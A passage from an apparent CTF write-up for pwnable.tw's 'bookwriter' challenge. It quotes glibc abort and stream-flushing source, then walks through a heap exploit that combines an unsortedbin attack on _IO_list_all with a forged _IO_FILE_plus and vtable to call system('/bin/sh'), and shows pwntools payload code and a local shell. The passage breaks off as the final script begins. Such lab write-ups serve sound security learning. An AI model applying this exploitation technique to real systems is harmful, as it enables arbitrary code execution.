	  <span class="k">if</span> <span class="p">(</span><span class="n">next</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span>
	    <span class="k">break</span><span class="p">;</span>
	<span class="p">}</span>

      <span class="cm">/* Determine what to print.  */</span>
      <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">;</span>
      <span class="n">size_t</span> <span class="n">len</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">cp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;%&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">cp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;s&#39;</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">str</span> <span class="o">=</span> <span class="n">va_arg</span> <span class="p">(</span><span class="n">ap</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">);</span>
	  <span class="n">len</span> <span class="o">=</span> <span class="n">strlen</span> <span class="p">(</span><span class="n">str</span><span class="p">);</span>
	  <span class="n">cp</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="k">else</span>
	<span class="p">{</span>
	  <span class="n">str</span> <span class="o">=</span> <span class="n">cp</span><span class="p">;</span>
	  <span class="n">len</span> <span class="o">=</span> <span class="n">next</span> <span class="o">-</span> <span class="n">cp</span><span class="p">;</span>
	  <span class="n">cp</span> <span class="o">=</span> <span class="n">next</span><span class="p">;</span>
	<span class="p">}</span>

      <span class="k">struct</span> <span class="n">str_list</span> <span class="o">*</span><span class="n">newp</span> <span class="o">=</span> <span class="n">alloca</span> <span class="p">(</span><span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">str_list</span><span class="p">));</span>
      <span class="n">newp</span><span class="o">-&gt;</span><span class="n">str</span> <span class="o">=</span> <span class="n">str</span><span class="p">;</span>
      <span class="n">newp</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
      <span class="n">newp</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">list</span><span class="p">;</span>
      <span class="n">list</span> <span class="o">=</span> <span class="n">newp</span><span class="p">;</span>
      <span class="o">++</span><span class="n">nlist</span><span class="p">;</span>
    <span class="p">}</span>

  <span class="kt">bool</span> <span class="n">written</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">nlist</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">struct</span> <span class="n">iovec</span> <span class="o">*</span><span class="n">iov</span> <span class="o">=</span> <span class="n">alloca</span> <span class="p">(</span><span class="n">nlist</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">iovec</span><span class="p">));</span>
      <span class="n">ssize_t</span> <span class="n">total</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

      <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">cnt</span> <span class="o">=</span> <span class="n">nlist</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="n">cnt</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">--</span><span class="n">cnt</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">iov</span><span class="p">[</span><span class="n">cnt</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">list</span><span class="o">-&gt;</span><span class="n">str</span><span class="p">;</span>
	  <span class="n">iov</span><span class="p">[</span><span class="n">cnt</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">list</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">;</span>
	  <span class="n">total</span> <span class="o">+=</span> <span class="n">list</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">;</span>
	  <span class="n">list</span> <span class="o">=</span> <span class="n">list</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
	<span class="p">}</span>

      <span class="n">written</span> <span class="o">=</span> <span class="n">WRITEV_FOR_FATAL</span> <span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">iov</span><span class="p">,</span> <span class="n">nlist</span><span class="p">,</span> <span class="n">total</span><span class="p">);</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">do_abort</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">total</span> <span class="o">=</span> <span class="p">((</span><span class="n">total</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">+</span> <span class="n">GLRO</span><span class="p">(</span><span class="n">dl_pagesize</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
		   <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="n">GLRO</span><span class="p">(</span><span class="n">dl_pagesize</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">));</span>
	  <span class="k">struct</span> <span class="n">abort_msg_s</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">__mmap</span> <span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">total</span><span class="p">,</span>
					    <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
					    <span class="n">MAP_ANON</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_likely</span> <span class="p">(</span><span class="n">buf</span> <span class="o">!=</span> <span class="n">MAP_FAILED</span><span class="p">))</span>
	    <span class="p">{</span>
	      <span class="n">buf</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="n">total</span><span class="p">;</span>
	      <span class="kt">char</span> <span class="o">*</span><span class="n">wp</span> <span class="o">=</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">msg</span><span class="p">;</span>
	      <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">cnt</span> <span class="o">&lt;</span> <span class="n">nlist</span><span class="p">;</span> <span class="o">++</span><span class="n">cnt</span><span class="p">)</span>
		<span class="n">wp</span> <span class="o">=</span> <span class="n">mempcpy</span> <span class="p">(</span><span class="n">wp</span><span class="p">,</span> <span class="n">iov</span><span class="p">[</span><span class="n">cnt</span><span class="p">].</span><span class="n">iov_base</span><span class="p">,</span> <span class="n">iov</span><span class="p">[</span><span class="n">cnt</span><span class="p">].</span><span class="n">iov_len</span><span class="p">);</span>
	      <span class="o">*</span><span class="n">wp</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>

	      <span class="cm">/* We have to free the old buffer since the application might
</span><span class="cm">		 catch the SIGABRT signal.  */</span>
	      <span class="k">struct</span> <span class="n">abort_msg_s</span> <span class="o">*</span><span class="n">old</span> <span class="o">=</span> <span class="n">atomic_exchange_acq</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">__abort_msg</span><span class="p">,</span>
							     <span class="n">buf</span><span class="p">);</span>
	      <span class="k">if</span> <span class="p">(</span><span class="n">old</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="n">__munmap</span> <span class="p">(</span><span class="n">old</span><span class="p">,</span> <span class="n">old</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
	    <span class="p">}</span>
	<span class="p">}</span>
    <span class="p">}</span>

  <span class="n">va_end</span> <span class="p">(</span><span class="n">ap</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">do_abort</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">BEFORE_ABORT</span> <span class="p">(</span><span class="n">do_abort</span><span class="p">,</span> <span class="n">written</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>

      <span class="cm">/* Kill the application.  */</span>
      <span class="n">abort</span> <span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// then abort is called
</span><span class="c1"></span>
<span class="cm">/* Cause an abnormal program termination with core-dump.  */</span>
<span class="kt">void</span>
<span class="nf">abort</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">sigaction</span> <span class="n">act</span><span class="p">;</span>
  <span class="n">sigset_t</span> <span class="n">sigs</span><span class="p">;</span>

  <span class="cm">/* First acquire the lock.  */</span>
  <span class="n">__libc_lock_lock_recursive</span> <span class="p">(</span><span class="n">lock</span><span class="p">);</span>

  <span class="cm">/* Now it&#39;s for sure we are alone.  But recursive calls are possible.  */</span>

  <span class="cm">/* Unlock SIGABRT.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">stage</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="o">++</span><span class="n">stage</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">__sigemptyset</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">sigs</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span>
	  <span class="n">__sigaddset</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">sigs</span><span class="p">,</span> <span class="n">SIGABRT</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
	<span class="n">__sigprocmask</span> <span class="p">(</span><span class="n">SIG_UNBLOCK</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sigs</span><span class="p">,</span> <span class="p">(</span><span class="n">sigset_t</span> <span class="o">*</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="cm">/* Flush all streams.  We cannot close them now because the user
</span><span class="cm">     might have registered a handler for SIGABRT.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">stage</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="o">++</span><span class="n">stage</span><span class="p">;</span>
      <span class="n">fflush</span> <span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="cm">/* Send signal which possibly calls a user handler.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">stage</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* This stage is special: we must allow repeated calls of
</span><span class="cm">	 `abort&#39; when a user defined handler for SIGABRT is installed.
</span><span class="cm">	 This is risky since the `raise&#39; implementation might also
</span><span class="cm">	 fail but I don&#39;t see another possibility.  */</span>
      <span class="kt">int</span> <span class="n">save_stage</span> <span class="o">=</span> <span class="n">stage</span><span class="p">;</span>

      <span class="n">stage</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">__libc_lock_unlock_recursive</span> <span class="p">(</span><span class="n">lock</span><span class="p">);</span>

      <span class="n">raise</span> <span class="p">(</span><span class="n">SIGABRT</span><span class="p">);</span>

      <span class="n">__libc_lock_lock_recursive</span> <span class="p">(</span><span class="n">lock</span><span class="p">);</span>
      <span class="n">stage</span> <span class="o">=</span> <span class="n">save_stage</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

  <span class="cm">/* There was a handler installed.  Now remove it.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">stage</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="o">++</span><span class="n">stage</span><span class="p">;</span>
      <span class="n">memset</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">act</span><span class="p">,</span> <span class="sc">&#39;\0&#39;</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sigaction</span><span class="p">));</span>
      <span class="n">act</span><span class="p">.</span><span class="n">sa_handler</span> <span class="o">=</span> <span class="n">SIG_DFL</span><span class="p">;</span>
      <span class="n">__sigfillset</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">act</span><span class="p">.</span><span class="n">sa_mask</span><span class="p">);</span>
      <span class="n">act</span><span class="p">.</span><span class="n">sa_flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">__sigaction</span> <span class="p">(</span><span class="n">SIGABRT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">act</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="cm">/* Now close the streams which also flushes the output the user
</span><span class="cm">     defined handler might has produced.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">stage</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="o">++</span><span class="n">stage</span><span class="p">;</span>
      <span class="n">__fcloseall</span> <span class="p">();</span>
    <span class="p">}</span>

  <span class="cm">/* Try again.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">stage</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="o">++</span><span class="n">stage</span><span class="p">;</span>
      <span class="n">raise</span> <span class="p">(</span><span class="n">SIGABRT</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="cm">/* Now try to abort using the system specific command.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">stage</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="o">++</span><span class="n">stage</span><span class="p">;</span>
      <span class="n">ABORT_INSTRUCTION</span><span class="p">;</span>
    <span class="p">}</span>

  <span class="cm">/* If we can&#39;t signal ourselves and the abort instruction failed, exit.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">stage</span> <span class="o">==</span> <span class="mi">7</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="o">++</span><span class="n">stage</span><span class="p">;</span>
      <span class="n">_exit</span> <span class="p">(</span><span class="mi">127</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="cm">/* If even this fails try to use the provided instruction to crash
</span><span class="cm">     or otherwise make sure we never return.  */</span>
  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="cm">/* Try for ever and ever.  */</span>
    <span class="n">ABORT_INSTRUCTION</span><span class="p">;</span>
<span class="p">}</span>

<span class="cm">/*
</span><span class="cm">  Flush all streams.  We cannot close them now because the user
</span><span class="cm">     might have registered a handler for SIGABRT.  
</span><span class="cm">
</span><span class="cm">  the fflush is equivalent to a call to _IO_flush_all_lockp 
</span><span class="cm">*/</span>

<span class="kt">int</span>
<span class="nf">_IO_flush_all_lockp</span> <span class="p">(</span><span class="kt">int</span> <span class="n">do_lock</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">last_stamp</span><span class="p">;</span>

<span class="cp">#ifdef _IO_MTSAFE_IO
</span><span class="cp"></span>  <span class="n">__libc_cleanup_region_start</span> <span class="p">(</span><span class="n">do_lock</span><span class="p">,</span> <span class="n">flush_cleanup</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">do_lock</span><span class="p">)</span>
    <span class="n">_IO_lock_lock</span> <span class="p">(</span><span class="n">list_all_lock</span><span class="p">);</span>
<span class="cp">#endif
</span><span class="cp"></span>
  <span class="n">last_stamp</span> <span class="o">=</span> <span class="n">_IO_list_all_stamp</span><span class="p">;</span>
  <span class="n">fp</span> <span class="o">=</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">_IO_list_all</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">run_fp</span> <span class="o">=</span> <span class="n">fp</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">do_lock</span><span class="p">)</span>
	<span class="n">_IO_flockfile</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>

      <span class="k">if</span> <span class="p">(((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
<span class="cp">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
</span><span class="cp"></span>	   <span class="o">||</span> <span class="p">(</span><span class="n">_IO_vtable_offset</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
	       <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span>
				    <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">))</span>
<span class="cp">#endif
</span><span class="cp"></span>	   <span class="p">)</span>
	  <span class="o">&amp;&amp;</span> <span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
	<span class="n">result</span> <span class="o">=</span> <span class="n">EOF</span><span class="p">;</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">do_lock</span><span class="p">)</span>
	<span class="n">_IO_funlockfile</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
      <span class="n">run_fp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">last_stamp</span> <span class="o">!=</span> <span class="n">_IO_list_all_stamp</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="cm">/* Something was added to the list.  Start all over again.  */</span>
	  <span class="n">fp</span> <span class="o">=</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">_IO_list_all</span><span class="p">;</span>
	  <span class="n">last_stamp</span> <span class="o">=</span> <span class="n">_IO_list_all_stamp</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="k">else</span>
	<span class="n">fp</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_chain</span><span class="p">;</span>
    <span class="p">}</span>

<span class="cp">#ifdef _IO_MTSAFE_IO
</span><span class="cp"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">do_lock</span><span class="p">)</span>
    <span class="n">_IO_lock_unlock</span> <span class="p">(</span><span class="n">list_all_lock</span><span class="p">);</span>
  <span class="n">__libc_cleanup_region_end</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="cp">#endif
</span><span class="cp"></span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The interesting part is in the <code>_IO_flush_all_lockp</code> function, it takes the <code>_IO_list_all</code> global variable to iterate through all the file streams.
What we wanna reach would be the <code>_IO_OVERFLOW (fp, EOF) == EOF</code> check, if the control the <code>__overflow</code> field of <code>fp</code> we could hiijack the control flow.</p>
<p>To do so we have to craft a fake <code>_IO_FILE_plus</code> structure on the heap and make the <code>_chain</code> field of an existing file structure point toward our fake structure.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="unsortedbin-attack">
        unsortedbin attack
        <a data-clipboard-text="https://nasm.re/posts/bookwriter/#unsortedbin-attack" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor unsortedbin attack" href="#unsortedbin-attack">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>To control the <code>_chain</code> of a file structure we can overwrite the value of <code>_IO_list_all</code> by the address of the unsortedbin with an unsortedbin attack. Then according to the structure of the <code>main_arena</code> the unsortedbin is close to other bins like smallbins. Give the fact that the <code>_chain</code> field is at <code>fp+0x68</code>, we have to take a look at what there is at <code>unsortedbin+0x68</code>. I will not dig into the handling of bins in the <code>main_arena</code> so for this time let&rsquo;s just assume that out of no where <code>unsortedbin+0x68</code> points to <code>small_bin[4]-&gt;bk</code>.</p>
<p>So all we have to do is to craft a fake file structure of size 0x60, free it and next time unsortedbin will be requested, if the requested size is not equal to the chunk of our fake file structure, the fake file structure will be put into the right smallbin.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="put-everything-together">
        Put everything together
        <a data-clipboard-text="https://nasm.re/posts/bookwriter/#put-everything-together" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Put everything together" href="#put-everything-together">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>We can easily craft the vtable to initialize only the <code>__overflow</code> function pointer to the address of <code>system</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">fake_vtable</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
<span class="n">fake_vtable</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x45390</span><span class="p">)</span> <span class="c1"># &amp;system</span>
</code></pre></div><p>To craft the <code>_IO_FILE_plus</code> file structure, we need to take care to satisfy this condition seen above in <code>_IO_flush_all_lockp</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">      <span class="k">if</span> <span class="p">(((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
<span class="cp">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
</span><span class="cp"></span>           <span class="o">||</span> <span class="p">(</span><span class="n">_IO_vtable_offset</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
               <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span>
                                    <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">))</span>
<span class="cp">#endif
</span><span class="cp"></span>           <span class="p">)</span>
          <span class="o">&amp;&amp;</span> <span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
</code></pre></div><p><code>fp-&gt;_mode</code> can be null, <code>fp-&gt;_IO_write_ptr</code> has to be greater than <code>fp-&gt;_IO_write_base</code>. Then <code>_IO_OVERFLOW (fp, EOF)</code> is reached.</p>
<p>Here comes the right file structure:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">fake_file</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\00</span><span class="s2">&#34;</span>                	<span class="c1"># _flags</span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span>               	<span class="c1"># _IO_read_ptr</span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1337</span><span class="p">)</span>    		<span class="c1"># _IO_read_end</span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x3c4520</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span>    <span class="c1"># _IO_read_base = _IO_list_all - 0x10</span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                  	<span class="c1"># _IO_write_base</span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>                  	<span class="c1"># _IO_write_ptr</span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">18</span>               	<span class="c1"># _IO_write_end ... __pad5</span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                  	<span class="c1"># _mode</span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">20</span>                	<span class="c1"># _unused2</span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0xd0</span><span class="p">)</span> 		<span class="c1"># vtable </span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="profit">
        PROFIT
        <a data-clipboard-text="https://nasm.re/posts/bookwriter/#profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor PROFIT" href="#profit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Here we are :)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ python3 exploit.py LOCAL
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/pwnable.tw/bookwriter/bookwriter&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x3ff000<span class="o">)</span>
    RUNPATH:  b<span class="s1">&#39;/home/nasm/Documents/pwn/pwnable.tw/bookwriter&#39;</span>
    FORTIFY:  Enabled
<span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;/home/nasm/Documents/pwn/pwnable.tw/bookwriter/bookwriter&#39;</span>: pid <span class="m">30480</span>
heap: 0x2243000
libc: 0x7fcca564c000
<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
*** Error in <span class="sb">`</span>/home/nasm/Documents/pwn/pwnable.tw/bookwriter/bookwriter<span class="err">&#39;</span>: malloc<span class="o">()</span>: memory corruption: 0x00007fcca5a10520 ***
$ id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>nasm<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>nasm<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>nasm<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,120<span class="o">(</span>lpadmin<span class="o">)</span>,131<span class="o">(</span>lxd<span class="o">)</span>,132<span class="o">(</span>sambashare<span class="o">)</span>,140<span class="o">(</span>libvirt<span class="o">)</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="annexes">
        Annexes
        <a data-clipboard-text="https://nasm.re/posts/bookwriter/#annexes" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Annexes" href="#annexes">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Final script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfmate</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>


<span class="c1"># Set up pwntools for the correct architecture</span>
